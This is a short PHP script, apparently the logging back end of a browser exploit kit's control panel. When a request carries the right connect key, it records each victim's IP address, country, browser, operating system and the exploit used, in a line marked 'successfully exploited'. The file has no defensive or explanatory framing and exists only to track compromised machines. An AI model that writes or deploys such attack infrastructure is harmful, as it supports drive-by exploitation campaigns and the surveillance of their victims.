<?php
require("./config.php");
if (isset($_GET['connect']) && $_GET['connect'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname']) && isset($_GET['exploit'])) {
    $exploit = htmlspecialchars($_GET['exploit'], ENT_QUOTES);
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, "[" . $date . "] [<img src='" . $flagsdir . "/" . $countrycode . ".png' />] [" . $browserType . "] [" . $OSName . "] " . htmlspecialchars($_SERVER['REMOTE_ADDR'], ENT_QUOTES) . " successfully exploited using '". $exploit . "'\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
}
?>
